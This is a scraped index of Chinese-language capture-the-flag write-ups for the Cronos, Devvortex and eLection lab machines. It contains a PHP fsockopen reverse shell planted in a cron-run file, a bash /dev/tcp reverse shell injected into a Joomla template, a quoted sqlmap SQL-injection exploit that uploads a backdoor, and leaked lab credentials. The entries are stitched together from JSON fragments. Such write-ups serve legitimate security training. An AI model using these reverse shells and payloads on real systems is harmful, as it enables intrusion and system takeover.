static::bothify($this-\u0026gt;generator-\u0026gt;parse($format)); /var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/fa_IR/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ja_JP/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ko_KR/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/lt_LT/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/zh_CN/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/test/Faker/Provider/InternetTest.php: $username = $this-\u0026gt;faker-\u0026gt;username();\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Cache/MemcachedConnector.php: list($username, $password) = $credentials;\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php: list($username, $password) = [\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/README.md: \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;root\u0026#39;, /var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ThrottlesLogins.php: $errors = [$this-\u0026gt;username() =\u0026gt; $message];\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php: $this-\u0026gt;username = $username;\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php: public function from($username, $icon = null)\r/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php: $username = $this-\u0026gt;safeStorage-\u0026gt;retrieveSafely(\u0026#39;username\u0026#39;);\r/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php: return $username !== null ? $username : \u0026#39;anonymous\u0026#39;;\r/var/www/laravel/vendor/league/flysystem/src/Adapter/Ftp.php: ) . \u0026#39;, username: \u0026#39; . $this-\u0026gt;getUsername()\r/var/www/laravel/vendor/monolog/monolog/doc/01-usage.md:$logger-\u0026gt;addInfo(\u0026#39;Adding a new user\u0026#39;, array(\u0026#39;username\u0026#39; =\u0026gt; \u0026#39;Seldaek\u0026#39;));\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/CouchDBHandler.php: \u0026#39;username\u0026#39; =\u0026gt; null,\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php: $dataArray[\u0026#39;username\u0026#39;] = $this-\u0026gt;username;\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php: $this-\u0026gt;username = $username;\r/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/Slack/SlackRecordTest.php: $username = \u0026#39;Monolog bot\u0026#39;;\r/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackHandlerTest.php: $this-\u0026gt;assertRegExp(\u0026#39;/username=Monolog/\u0026#39;, $content);\r/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackWebhookHandlerTest.php: \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;test-username\u0026#39;,\r/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php: \u0026#39;getUsername\u0026#39; =\u0026gt; array(\r/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php: \u0026#39;getUsername\u0026#39; =\u0026gt; array($methodProphecy)\r/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php: \u0026#39;isUsername\u0026#39; =\u0026gt; array(\r/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst: \u0026#39;{username}\u0026#39;=\u0026gt;$row[\u0026#39;username\u0026#39;], /var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst: \u0026#39;{username}\u0026#39;=\u0026gt;$user[\u0026#39;username\u0026#39;], /var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Plugins/PopBeforeSmtpPlugin.php: $this-\u0026gt;_username = $username;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/AuthHandler.php: $this-\u0026gt;_username = $username;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#34;DOMAIN\\user\u0026#34;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#34;domain.com\\user\u0026#34;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;test\u0026#39;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;user\u0026#39;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;user@DOMAIN\u0026#39;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;user@domain.com\u0026#39;;\r/var/www/laravel/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php: private $username = \u0026#39;\u0026#39;;\r/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php: $request = Request::create(\u0026#39;http://username:password@test.com\u0026#39;);\r/var/www/laravel/vendor/symfony/http-foundation/Tests/ServerBagTest.php: \u0026#39;AUTHORIZATION\u0026#39; =\u0026gt; \u0026#39;Basic \u0026#39;.base64_encode(\u0026#39;username:pass:word\u0026#39;),\r[+] Searching specific hashes inside files - less false positives (limit 70)\r/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/RavenHandlerTest.php:43f6017361224d098402974103bfc53d:a6a0538fc2934ba2bed32e08741b2cd3 /var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/RavenHandlerTest.php:43f6017361224d098402974103bfc53d:a6a0538fc2934ba2bed32e08741b2cd3 看到有个\n* * * * * root php /var/www/laravel/artisan schedule:run \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1 将反弹shell的php代码写入artisan\n\u0026lt;?php\r$sock = fsockopen(\u0026#34;10.10.16.9\u0026#34;, 5656);\r$descriptorspec = array(\r0 =\u0026gt; $sock,\r1 =\u0026gt; $sock,\r2 =\u0026gt; $sock\r);\r$process = proc_open(\u0026#39;/bin/sh\u0026#39;, $descriptorspec, $pipes);\rproc_close($process);\r?\u0026gt; ──(root㉿kali)-[~/桌面/vpn]\r└─# nc -lvnp 5656\rlistening on [any] 5656 ...\rconnect to [10.10.16.9] from (UNKNOWN) [10.129.227.211] 43994\rwhoami\rroot\rwhich python3\r/usr/bin/python3\rpython -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39;\rroot@cronos:~# ls\rls\rfix_dns.sh root.txt 拿到flag先不急着跑，很好奇为什么10.10.10.13不是cronos.htb的域名，去看看apache的配置文件\nsystemctl status bind\rcd /etc/bind\rls -la\rroot@cronos:/etc/bind# cat named.conf\rcat named.conf\r// This is the primary configuration file for the BIND DNS server named.\r//\r// Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file.\r//\r// If you are just adding zones, please do that in /etc/bind/named.conf.local\rinclude \u0026#34;/etc/bind/named.conf.options\u0026#34;;\rinclude \u0026#34;/etc/bind/named.conf.local\u0026#34;;\rinclude \u0026#34;/etc/bind/named.conf.default-zones\u0026#34;; 找到倒霉蛋文件了，位于/etc/bind/zones下\nroot@cronos:/etc/bind# cat named.conf\rcat named.conf\r// This is the primary configuration file for the BIND DNS server named.\r//\r// Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file.\r//\r// If you are just adding zones, please do that in /etc/bind/named.conf.local\rinclude \u0026#34;/etc/bind/named.conf.options\u0026#34;;\rinclude \u0026#34;/etc/bind/named.conf.local\u0026#34;;\rinclude \u0026#34;/etc/bind/named.conf.default-zones\u0026#34;; root@cronos:/etc/bind# cat named.conf.local cat named.conf.local\r//\r// Do any local configuration here\r//\r// Consider adding the 1918 zones here, if they are not used in your\r// organization\r//include \u0026#34;/etc/bind/zones.rfc1918\u0026#34;;\rzone \u0026#34;cronos.htb\u0026#34; {\rtype master;\rfile \u0026#34;/etc/bind/zones/db.ns1.cronos.htb\u0026#34;; # zone file path\rallow-transfer { any; };\r};\rzone \u0026#34;129.10.in-addr.arpa\u0026#34; {\rtype master;\rfile \u0026#34;/etc/bind/zones/db.10.129\u0026#34;;\rallow-transfer { any; };\r}; 原来是左田，named.conf包含了named.conf.local，named.conf.local又包含了/etc/bind/zones/db.ns1.cronos.htb\nroot@cronos:/etc/bind/zones# cat db.10.129\rcat db.10.129\r$TTL 604800\r@ IN SOA cronos.htb. ns1.cronos.htb. (\r3 ; Serial\r604800 ; Refresh\r86400 ; Retry\r2419200 ; Expire\r604800 ) ; Negative Cache TTL\r; name servers\rIN NS ns1.cronos.htb.\r; PTR Records\r211.227 IN PTR ns1.cronos.htb. ; 10.10.10.13\rroot@cronos:/etc/bind/zones# cat db.ns1.cronos.htb\rcat db.ns1.cronos.htb\r$TTL 604800\r@ IN SOA cronos.htb. admin.cronos.htb. (\r3 ; Serial\r604800 ; Refresh\r86400 ; Retry\r2419200 ; Expire\r604800 ) ; Negative Cache TTL\r;\r; name servers - NS records\rIN NS ns1.cronos.htb.\r; name servers - A records\rns1.cronos.htb. IN A 10.10.10.13\r; 10.10.10.0/24 - A records\rcronos.htb. IN A 10.10.10.13\rwww IN A 10.10.10.13\radmin IN A 10.10.10.13\rroot@cronos:/etc/bind/zones# pwd\rpwd\r/etc/bind/zones\rroot@cronos:/etc/bind/zones# ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/cronos/","summary":"nmap -sS -sV -p- --min-rate 5000 10.129.227.211 ┌──(root㉿kali)-[~/桌面/vpn] └─# netstat -antlp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 192.168.199.128:58988 209.58.165.155:443 ESTABLISHED 15050/openvpn ┌──(root㉿k","title":""},{"content":"nmap -sS -A -sV -sC -p- --min-rate 5000 -T4 10.129.171.193\rStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-27 16:38 CST\rStats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 2.92% done; ETC: 16:39 (0:00:33 remaining)\rStats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 3.65% done; ETC: 16:38 (0:00:26 remaining)\rStats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 6.22% done; ETC: 16:39 (0:00:30 remaining)\rStats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 6.99% done; ETC: 16:38 (0:00:27 remaining)\rWarning: 10.129.171.193 giving up on port because retransmission cap hit (6).\rNmap scan report for 10.129.171.193\rHost is up (0.49s latency).\rNot shown: 50783 filtered tcp ports (no-response), 14750 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\r| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\r|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\r80/tcp open http nginx 1.18.0 (Ubuntu)\r|_http-server-header: nginx/1.18.0 (Ubuntu)\r|_http-title: Did not follow redirect to http://devvortex.htb/\rAggressive OS guesses: Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.8 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%), Linux 5.0 - 5.5 (92%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 2 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 5900/tcp)\rHOP RTT ADDRESS\r1 607.91 ms 10.10.14.1\r2 608.43 ms 10.129.171.193\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 136.23 seconds 将扫描出来的虚拟域名添加到hosts文件中\n翻看了80端口没有发现什么可以和服务端交互的功能\n尝试爆破子域名\nwfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u \u0026#34;http://devvortex.htb/\u0026#34; -H \u0026#34;Host: FUZZ.devvortex.htb\u0026#34; --hl 7 发现存在dev.devvortex.htb子域名，推测这个域名又是一个虚拟主机的域名，在hosts文件里修改dev.devvortex.htb与ip地址的映射\n扫描下目录\ngobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -r -x asp,cgi,txt,log,conf,cgi-bin,bak,db,git -t 1000 --no-error -b 502 --exclude-length 3653\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://dev.devvortex.htb\r[+] Method: GET\r[+] Threads: 1000\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 502\r[+] Exclude Length: 3653\r[+] User Agent: gobuster/3.6\r[+] Extensions: txt,log,bak,git,asp,cgi,conf,cgi-bin,db\r[+] Follow Redirect: true\r[+] Expanded: true\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\rhttp://dev.devvortex.htb/images (Status: 200) [Size: 31]\rhttp://dev.devvortex.htb/templates (Status: 200) [Size: 31]\rhttp://dev.devvortex.htb/home (Status: 200) [Size: 23221]\rhttp://dev.devvortex.htb/plugins (Status: 200) [Size: 31]\rhttp://dev.devvortex.htb/language (Status: 200) [Size: 31]\rhttp://dev.devvortex.htb/components (Status: 200) [Size: 31]\rhttp://dev.devvortex.htb/README.txt (Status: 200) [Size: 4942]\rhttp://dev.devvortex.htb/cache (Status: 200) [Size: 31]\rhttp://dev.devvortex.htb/robots.txt (Status: 200) [Size: 764] 在readme.txt中看到joomla的版本为4.2\n在网上找到一个信息泄露的漏洞\npoc\nhttp://joomla_host/api/index.php/v1/config/application?public=true 拿到joomla用户凭据\nlewis:P4ntherg0t1n5r3c0n## 登录后台，修改模板处在error.php中添加反弹shell语句\n\u0026lt;?php system(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.45.226/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;); ?\u0026gt; 访问/administrator/templates/atum/error.php触发反弹shell命令\n拿到shell后没有权限读取/home/logan/users.txt\n尝试用joomla用户账密登录mysql数据库（密码复用错误配置）\n","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/devvortex/","summary":"nmap -sS -A -sV -sC -p- --min-rate 5000 -T4 10.129.171.193 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-27 16:38 CST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.92% done; ETC: 16:39 (0:00:33 remaining) Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 3.65% done; ETC: 16:38 (0:00:26 remaining) Stats: 0:00:02","title":""},{"content":"┌──(root💀Chinchin)-[~/桌面]\r└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.213.211\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 21:50 CST\rStats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 1.66% done; ETC: 21:50 (0:00:00 remaining)\rStats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 3.28% done; ETC: 21:50 (0:00:00 remaining)\rStats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 4.18% done; ETC: 21:50 (0:00:00 remaining)\rNmap scan report for 192.168.213.211\rHost is up (0.29s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)\r| 256 7889b3a2751276922af98d27c108a7b9 (ECDSA)\r|_ 256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)\r80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.29 (Ubuntu)\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.93%E=4%D=5/15%OT=22%CT=1%CU=43591%PV=Y%DS=4%DC=T%G=Y%TM=646238E\rOS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%TS=C)SEQ(SP=108%GC\rOS:D=1%ISR=10A%TI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1\rOS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE\rOS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=\rOS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y\rOS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16\rOS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=9784%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 4 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 587/tcp)\rHOP RTT ADDRESS\r1 274.18 ms 192.168.45.1\r2 274.21 ms 192.168.45.254\r3 276.92 ms 192.168.251.1\r4 277.04 ms 192.168.213.211\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 59.84 seconds gobuster dir --url http://192.168.213.211/ -w /usr/share/wordlists//dirbuster/directory-list-lowercase-2.3-medium.txt -k -r -x -e php,cgi,txt,log,conf /election (Status: 200) [Size: 7003]\r/phpmyadmin (Status: 200) [Size: 10531] 查看phpmyadmin版本\nhttp://192.168.213.211/phpmyadmin//doc/html/index.html phpmyadmin的版本为4.6.6，没有什么漏洞。好像努力错方向了，选择大于努力，换一个选择。\n──(root💀Chinchin)-[~/桌面]\r└─# searchsploit election -------------------------------------------------------------------------------------- ---------------------------------\rExploit Title | Path\r-------------------------------------------------------------------------------------- ---------------------------------\rAdobe Flash - Selection.setFocus Use-After-Free | multiple/dos/40307.txt\rAdobe Flash Selection.SetSelection - Use-After-Free | windows_x86-64/dos/39043.txt\reLection 2.0 - \u0026#39;id\u0026#39; SQL Injection | php/webapps/48122.txt\rLinux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86 | linux_x86-64/local/9083.c\rMicrosoft Internet Explorer 9 - IEFRAME CSelection­Interact­Button­Behavior::_Upda | windows/dos/40907.html\rMicrosoft Windows Server 2003 - AD BROWSER ELECTION Remote Heap Overflow | windows/dos/16166.py\rSunView (SunOS 4.1.1) - \u0026#39;selection_svc\u0026#39; Remote File Read | solaris/remote/19040.txt\r-------------------------------------------------------------------------------------- --------------------------------- # Title: eLection 2.0 - \u0026#39;id\u0026#39; SQL Injection\r# Date: 2020-02-21\r# Exploit Author: J3rryBl4nks\r# Vendor Homepage: https://sourceforge.net/projects/election-by-tripath/\r# Software Link: https://sourceforge.net/projects/election-by-tripath/files/#Version 2.0\r# Tested on Ubuntu 19/Kali Rolling\r# The eLection Web application is vulnerable to authenticated SQL Injection which leads to remote code execution:\r# Login to the admin portal and browse to the candidates section. Capture the request in BurpSuite and save it to file:\rPOST /election/admin/ajax/op_kandidat.php HTTP/1.1\rHost: HOSTNAME\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\rAccept: */*\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rReferer: http://HOSTNAME/election/admin/kandidat.php?_\rContent-Type: application/x-www-form-urlencoded; charset=UTF-8\rX-Requested-With: XMLHttpRequest\rContent-Length: 17\rConnection: close\rCookie: el_listing_panitia=5; el_mass_adding=false; el_listing_guru=5; el_listing_siswa=5; PHPSESSID=b4f0c3bbccd80e9d55fbe0269a29f96a; el_lang=en-us\raksi=fetch\u0026amp;id=256\rSend the request to SQLMap with the following parameters:\rsqlmap -r getcandidate --level=5 --risk=3 --os-shell -p id\rSQLMap will find the injection:\r---\rParameter: id (POST)\rType: boolean-based blind\rTitle: AND boolean-based blind - WHERE or HAVING clause\rPayload: aksi=fetch\u0026amp;id=256 AND 8584=8584\rType: time-based blind\rTitle: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\rPayload: aksi=fetch\u0026amp;id=256 AND (SELECT 8551 FROM (SELECT(SLEEP(5)))nYfJ)\rType: UNION query\rTitle: Generic UNION query (NULL) - 5 columns\rPayload: aksi=fetch\u0026amp;id=-9798 UNION ALL SELECT NULL,NULL,CONCAT(0x7170707171,0x676d755461434e486f49475051707357694861534e664f416f434269487042545a76454f5843584b,0x71717a7871),NULL,NULL-- dWMc\r---\r[09:39:07] [WARNING] unable to automatically parse any web server path\r[09:39:07] [INFO] trying to upload the file stager on \u0026#39;/opt/lampp/htdocs/election/\u0026#39; via LIMIT \u0026#39;LINES TERMINATED BY\u0026#39; method\r[09:39:07] [INFO] the file stager has been successfully uploaded on \u0026#39;/opt/lampp/htdocs/election/\u0026#39; - http://HOSTNAME/election/tmpumlfm.php\r[09:39:07] [INFO] the backdoor has been successfully uploaded on \u0026#39;/opt/lampp/htdocs/election/\u0026#39; - http://HOSTNAME/election/tmpbpfkq.php\r[09:39:07] [INFO] calling OS shell. To quit type \u0026#39;x\u0026#39; or \u0026#39;q\u0026#39; and press ENTER\ros-shell\u0026gt;\rDue to the way the setup of the application requires you to change permissions on the directory of the web app, you should be able to get a shell.\rhttps://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md 被骗了，跑sqlmap跑了半天都没找到sql注入的点\n看了下wp，phpmyadmin存在弱密码\nroot:toor 登陆后找到/admin的id和密码\n1234:Zxc123!@# 进入后台，又卡住了，以为是头像上传点的文件上传getshell，上传到文件保存后变为\nHTTP/1.1 200 OK\rDate: Mon, 15 May 2023 15:13:26 GMT\rServer: Apache/2.4.29 (Ubuntu)\rExpires: Thu, 19 Nov 1981 08:52:00 GMT\rCache-Control: no-store, no-cache, must-revalidate\rPragma: no-cache\rContent-Length: 56\rConnection: close\rContent-Type: text/html; charset=UTF-8\r{\u0026#34;code\u0026#34;:\u0026#34;200\u0026#34;,\u0026#34;data\u0026#34;:\u0026#34;..\\/media\\/kandidat\\/76.jpg?_IBF\u0026#34;} 全是兔子洞真几把的烦\n点击view logs\n[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123\r[2020-04-03 00:13:53] Love added candidate \u0026#39;Love\u0026#39;.\r[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).\r[2023-05-15 20:32:53] Love has been logged in from Unknown IP on Firefox (Linux).\r[2023-05-15 20:35:39] Love changed a candidate photo (ID = 76).\r[2023-05-15 20:35:52] Love updated candidate data (ID = 76).\r[2023-05-15 20:40:29] [ERROR.CDTPHOTO] Unsupported source file format!\r[2023-05-15 20:40:41] [ERROR.CDTPHOTO] Unsupported source file format!\r[2023-05-15 20:40:55] [ERROR.CDTPHOTO] Unsupported source file format!\r[2023-05-15 20:41:12] Love changed a candidate photo (ID = 76).\r[2023-05-15 20:43:27] Love changed a candidate photo (ID = 76). 尝试ssh登录\nlove:P@$$w0rd@123 ┌──(root💀Chinchin)-[~/桌面/htb]\r└─# ssh love@192.168.213.211 The authenticity of host \u0026#39;192.168.213.211 (192.168.213.211)\u0026#39; can\u0026#39;t be established.\rED25519 key fingerprint is SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ.\rThis key is not known by any other names.\rAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\rWarning: Permanently added \u0026#39;192.168.213.211\u0026#39; (ED25519) to the list of known hosts.\rlove@192.168.213.211\u0026#39;s password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)\r* Documentation: https://help.ubuntu.com\r* Management: https://landscape.canonical.com\r* Support: https://ubuntu.com/advantage\r* Canonical Livepatch is available for installation.\r- Reduce system reboots and improve kernel security. Activate at:\rhttps://ubuntu.com/livepatch\r471 packages can be updated.\r358 updates are security updates.\rFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\rYour Hardware Enablement Stack (HWE) is supported until April 2023.\rLast login: Thu Apr 9 23:19:28 2020 from 192.168.1.5\rlove@election:~$ whoami\rlove\rlove@election:~$ id\ruid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)\rlove@election:~$ uname -a\rLinux election 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\rlove@election:~$ pwd\r/home/love love@election:~$ ./linpeas.sh\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄\r▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▀▀▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 